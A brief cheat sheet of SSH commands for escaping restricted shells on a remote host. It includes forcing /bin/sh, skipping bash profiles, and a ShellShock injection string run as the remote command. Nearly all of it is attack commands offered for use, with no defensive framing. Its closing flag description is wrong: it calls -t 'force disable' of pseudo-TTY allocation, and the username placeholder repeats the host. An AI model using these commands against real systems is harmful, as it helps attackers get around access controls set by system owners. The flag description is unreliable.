Use SSH on your machine to exec commands before the remote shell is loaded:
  ssh <RHOST>@<RHOST> -t "/bin/sh"

Start remote shell without loading the "rc" profile (where most limitations are often configured)
  ssh <RHOST>@<RHOST> -t "bash --noprofile"

Try ShellShock on vulnerable shell implementations
  ssh <RHOST>@<RHOST> -t "() { :; }; /bin/bash"


Sometimes just -T will work
ssh <ruser>@<rhost> -T



-T is to disable pseudo-TTY allocation
-t is to force disable pseudo-TTY allocation
